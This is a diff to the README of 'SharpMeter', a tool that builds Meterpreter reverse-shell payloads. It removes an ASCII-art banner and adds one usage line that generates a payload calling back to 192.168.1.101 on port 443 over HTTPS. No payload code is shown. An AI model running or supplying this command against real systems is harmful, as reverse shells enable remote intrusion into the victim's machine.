@@ -1,11 +1,5 @@
 # SharpMeter
-
- ____  _                      __  __      _
-/ ___|| |__   __ _ _ __ _ __ |  \/  | ___| |_ ___ _ __
-\___ \| '_ \ / _` | '__| '_ \| |\/| |/ _ \ __/ _ \ '__|
- ___) | | | | (_| | |  | |_) | |  | |  __/ ||  __/ |
-|____/|_| |_|\__,_|_|  | .__/|_|  |_|\___|\__\___|_|
-                       |_|              by @vvalien1
-
-
 A Simple Way To Make Meterpreter Reverse Payloads
+
+# Example
+python SharpMeter.py 192.168.1.101 443 compileme.cs https
